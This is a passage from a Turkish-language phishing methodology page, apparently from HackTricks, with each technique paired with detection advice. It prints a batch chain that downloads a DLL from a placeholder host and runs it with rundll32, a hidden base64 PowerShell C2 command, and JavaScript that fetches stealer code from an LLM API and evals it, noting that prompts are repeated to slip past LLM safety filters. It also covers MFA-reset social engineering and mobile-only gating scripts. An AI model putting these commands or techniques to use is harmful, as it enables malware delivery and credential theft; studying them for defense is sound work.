* Yem: adım adım “düzeltme” talimatlarını gösteren bir **Güncelle** düğmesine sahip, kopyalanmış bir ulusal CERT duyurusu. Kurbanlara DLL indiren ve `rundll32` aracılığıyla çalıştıran bir batch dosyası çalıştırmaları söylenir.<sup>[[12]](#references)</sup>
* Gözlemlenen tipik batch zinciri:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest`, payload'ı `%TEMP%` konumuna bırakır; kısa bir sleep ağ jitter'ını gizler, ardından `rundll32` dışa aktarılan giriş noktasını (`notepad`) çağırır.
* DLL, host kimliğini beacon olarak gönderir ve birkaç dakikada bir C2'yi yoklar. Uzaktan gelen görevler, gizli şekilde ve policy bypass ile çalıştırılan **base64-encoded PowerShell** olarak ulaşır:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Bu, C2 esnekliğini korur (sunucu, DLL'yi güncellemeden görevleri değiştirebilir) ve konsol pencerelerini gizler. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` ifadelerini birlikte kullanan `rundll32.exe` alt süreçleri olan PowerShell örneklerini arayın.
* Savunma ekipleri, `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'lerini ve DLL yüklendikten sonra başlayan 5 dakikalık polling aralıklarını arayabilir.

---

## RTB üzerinden görüntüleme tetiklemeli malvertising

Tıklama gerektiren sponsorlu bir arama sonucunun aksine, RTB reklamı; reklam öğesi bir web sitesinde veya uygulamada görüntülendiğinde üçüncü taraf JavaScript yükleyebilir. Citizen Lab, reklam etiketlerinin reklam tanımlayıcılarıyla ayrı bir karar sunucusuna çağrı yaptığını gözlemledi. Gösterimlerin çoğu boş yanıt aldı; seçili gösterimler JavaScript alabiliyordu. Bu nedenle, tekrar oynatma sırasında alınan zararsız bir yanıt, her görüntüleyenin aynı içeriği aldığı anlamına gelmez.<sup>[[14]](#references)</sup>

Bu, kendi başına bir exploit değil, bir **dağıtım mekanizmasıdır**: Reklam görüntüleme bağlamında JavaScript çalıştırılması, casus yazılımın otomatik olarak yüklenmesini sağlamaz. Temel tarayıcı veya OS exploit'i açıklanmadığından, tek başına bir reklam gösterimi ya da karar sunucusu isteği enfeksiyon kanıtı değildir. RTB hedeflemesindeki tanımlayıcı bağlantısı için bkz. [Tehdit Modelleme ve Kimlik Ayrıştırma](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## AI Destekli Phishing Operasyonları
Saldırganlar artık tamamen kişiselleştirilmiş tuzaklar oluşturmak ve gerçek zamanlı etkileşim kurmak için **LLM ve ses klonlama API'lerini** zincirleme kullanıyor.

| Katman | Tehdit aktörünün kullanımına örnek |
|-------|-----------------------------|
|Otomasyon|Rastgeleleştirilmiş ifadeler ve izleme bağlantılarıyla 100 binden fazla e-posta / SMS oluşturup gönderme.|
|Üretken AI|Halka açık M&A'lara, sosyal medyadaki iç şakalara atıfta bulunan *tek seferlik* e-postalar oluşturma; callback dolandırıcılığında CEO'nun deepfake sesini kullanma.|
|Agentic AI|Alan adlarını otonom olarak kaydetme, açık kaynak istihbaratını tarama, kurban tıklayıp kimlik bilgilerini göndermediğinde sonraki aşama e-postalarını hazırlama.|

**Savunma:**  
• Güvenilmeyen otomasyon kaynaklı mesajları (ARC/DKIM anormallikleri üzerinden) vurgulayan **dinamik banner'lar** ekleyin.  
• Yüksek riskli telefon talepleri için **ses biyometrisi doğrulama ifadeleri** kullanın.  
• Farkındalık programlarında AI tarafından oluşturulan tuzakları sürekli simüle edin; statik şablonların devri geçti.

Ayrıca bkz. – kimlik bilgilerini ele geçirmeye yönelik phishing için agentic tarayıcıların kötüye kullanımı:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Ayrıca bkz. – gizli bilgilerin envanteri ve tespiti için AI agent'larının yerel CLI araçlarını ve MCP'yi kötüye kullanması:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Phishing JavaScript'inin LLM yardımıyla çalışma zamanında derlenmesi (tarayıcı içi kod üretimi)

Saldırganlar, zararsız görünen HTML gönderip JavaScript'i **güvenilir bir LLM API'sinden** isteyerek ve ardından tarayıcıda çalıştırarak (örn. `eval` veya dinamik `<script>`) **stealer'ı çalışma zamanında oluşturabilir**.<sup>[[8]](#references)</sup>

1. **Obfuscation olarak prompt:** Dışarı sızdırma URL'lerini/Base64 dizelerini prompt'a kodlayın; güvenlik filtrelerini aşmak ve halüsinasyonları azaltmak için ifadeleri yineleyin.
2. **İstemci tarafı API çağrısı:** Yükleme sırasında JS, herkese açık bir LLM'i (Gemini/DeepSeek vb.) veya CDN proxy'sini çağırır; statik HTML'de yalnızca prompt/API çağrısı bulunur.
3. **Birleştir ve çalıştır:** Yanıtı birleştirip çalıştırın (her ziyarette polimorfik):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** oluşturulan kod, yem içeriğini kişiselleştirir (ör. LogoKit token parsing) ve kimlik bilgilerini prompt içinde gizlenmiş endpoint'e gönderir.

**Kaçınma özellikleri**
- Trafik, bilinen LLM domain'lerine veya güvenilir CDN proxy'lerine ulaşır; bazen backend'e WebSockets üzerinden bağlanır.
- Statik payload yoktur; kötü amaçlı JS yalnızca render işleminden sonra bulunur.
- Deterministik olmayan üretimler, her oturum için **benzersiz** stealer'lar oluşturur.

**Tespit önerileri**
- JS etkin sandbox'lar çalıştırın; LLM yanıtlarından kaynaklanan **runtime `eval`/dinamik script oluşturma** işlemlerini işaretleyin.
- LLM API'lerine yapılan front-end POST'ları hemen ardından dönen metin üzerinde kullanılan `eval`/`Function` işlemleri için arama yapın.
- İstemci trafiğinde yetkisiz LLM domain'lerinin görülmesi ve ardından kimlik bilgisi POST'ları yapılması durumunda uyarı verin.

---

## MFA Fatigue / Push Bombing Varyantı – Zorunlu Sıfırlama
Klasik push-bombing'in yanı sıra operatörler, yardım masası görüşmesi sırasında **yeni bir MFA kaydını zorla başlatır** ve kullanıcının mevcut token'ını geçersiz kılar. Sonraki giriş istemleri kurbana meşru görünür.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

AzureAD/AWS/Okta olaylarını izleyin: **`deleteMFA` + `addMFA`** işlemleri **aynı IP’den dakikalar içinde** gerçekleşiyor mu?



## Clipboard Hijacking / Pastejacking

Saldırganlar, güvenliği ihlal edilmiş veya typosquatting yapan bir web sayfası üzerinden kurbanın panosuna kötü amaçlı komutları sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırmaya kandırarak herhangi bir indirme veya ek olmadan istedikleri kodu çalıştırabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing ve Kötü Amaçlı Uygulama Dağıtımı (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR ile sosyal mühendislik kullanarak WhatsApp cihaz bağlama ele geçirme
* Bir yem sayfası (ör. sahte bir bakanlık/CERT “kanalı”) WhatsApp Web/Desktop QR kodu gösterir ve kurbana kodu okutmasını söyleyerek saldırganı sessizce **bağlı cihaz** olarak ekler.<sup>[[12]](#references)</sup>
* Saldırgan, oturum kaldırılana kadar sohbetleri ve kişileri hemen görebilir. Kurbanlar daha sonra “yeni cihaz bağlandı” bildirimi görebilir; savunma ekipleri, güvenilmeyen QR sayfalarının ziyaret edilmesinden kısa süre sonra gerçekleşen beklenmedik cihaz bağlama olaylarını arayabilir.

### Tarayıcı botlarından/kum havuzlarından kaçınmak için mobil cihaz şartı koyan phishing
Operatörler, masaüstü tarayıcı botlarının son sayfalara ulaşmasını önlemek için phishing akışlarını giderek daha sık basit bir cihaz kontrolünün arkasına alıyor. Yaygın bir yöntem, dokunmatik ekranı destekleyen bir DOM olup olmadığını test eden ve sonucu bir sunucu uç noktasına gönderen küçük bir betiktir; mobil olmayan istemciler HTTP 500 (veya boş bir sayfa) alırken, mobil kullanıcılara akışın tamamı sunulur.<sup>[[7]](#references)</sup>

Minimal istemci parçacığı (tipik mantık):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` mantığı (basitleştirilmiş):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Sunucuda sıklıkla gözlemlenen davranış:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- Sonraki GET isteklerine `is_mobile=false` olduğunda 500 (veya placeholder) döndürür; phishing içeriğini yalnızca `true` olduğunda sunar.

Avlama ve tespit sezgisel kuralları:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetrisi: `GET /static/detect_device.js` → `POST /detect` → mobil olmayanlar için HTTP 500 dizisi; meşru mobil kurban yolları ise 200 ve devamında HTML/JS döndürür.
- İçeriği yalnızca `ontouchstart` veya benzeri cihaz kontrollerine göre sunan sayfaları engelleyin veya incelemeye alın.

Savunma ipuçları:
- Kısıtlanmış içeriği açığa çıkarmak için crawler'ları mobil benzeri fingerprint'lerle ve JS etkin şekilde çalıştırın.
- Yeni kaydedilmiş domain'lerde `POST /detect` sonrasında gelen şüpheli 500 yanıtları için uyarı oluşturun.

## References

- [1] [Phishing'de Kullanılan Domain Varyasyonlarını Oluşturma (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing'i Bulma: Araçlar ve Teknikler (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC Kullanarak Kimlik Bilgilerini Çalma ve 2FA'yı Atlatma (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC ile Oturumları Çalma ve 2FA'yı Atlatma (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy'de Postfix ile DKIM Kurulumu ve Yapılandırması (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Küresel Olay Müdahale Raporu – Sosyal Mühendislik Sürümü](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Sessiz Smishing – mobil kısıtlamalı phishing altyapısı ve sezgisel kurallar (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Çalışma Zamanında Birleştirme Saldırılarının Yeni Cephesi: Gerçek Zamanlı Phishing JavaScript'i Üretmek için LLM'lerden Yararlanma](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Kimliğe Bürünme, Tıklama Ele Geçirme ve TDS: Bir Malware Dağıtım Ekosisteminin İç Yüzü](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com'u Bitsquatting ile Hedefleme (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bit çevirme yoluyla Microsoft'un windows.com adresine giden trafiği ele geçirme (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Aşk mı? Aslında: Pakistan'da hedefli bir spyware kampanyasında yem olarak kullanılan sahte flört uygulaması](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC'leri ve örnekleri](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [AdFection'ı Ortaya Çıkarmak: Discover-Tech, Hedefli Reklamları Sıfır Tıklamalı Paralı Asker Spyware'i için Nasıl Bir Dağıtım Hattına Dönüştürdü](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
